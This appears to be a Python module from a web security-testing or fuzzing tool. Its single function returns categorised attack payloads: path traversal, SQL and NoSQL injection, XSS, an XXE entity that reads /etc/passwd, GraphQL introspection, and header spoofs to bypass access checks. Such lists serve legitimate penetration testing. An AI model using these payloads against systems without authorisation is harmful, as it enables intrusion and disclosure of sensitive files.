from typing import Dict, List

def get_payloads() -> Dict[str, List[str]]:
    return {
        'generic': [
            "../",
            "%00",
            "%2e%2e%2f",
            "{\"test\":1}",
            "' OR '1'='1",
            "\"><script>alert(1)</script>",
            "../../../../etc/passwd",
        ],
        'rest': [
            "Content-Type: application/json;charset=UTF-7",
        ],
        'graphql': [
            "{\"query\":\"{__schema{types{name}}}\"}",
        ],
        'xml': [
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY y SYSTEM \"file:///etc/passwd\">]><x>&y;</x>",
        ],
        'bypass': [
             "X-Forwarded-For: 127.0.0.1",
             "X-Originating-IP: 127.0.0.1",
             "{\"role\":\"admin\"}",
             "{\"$ne\":\"\"}"
        ]
    }
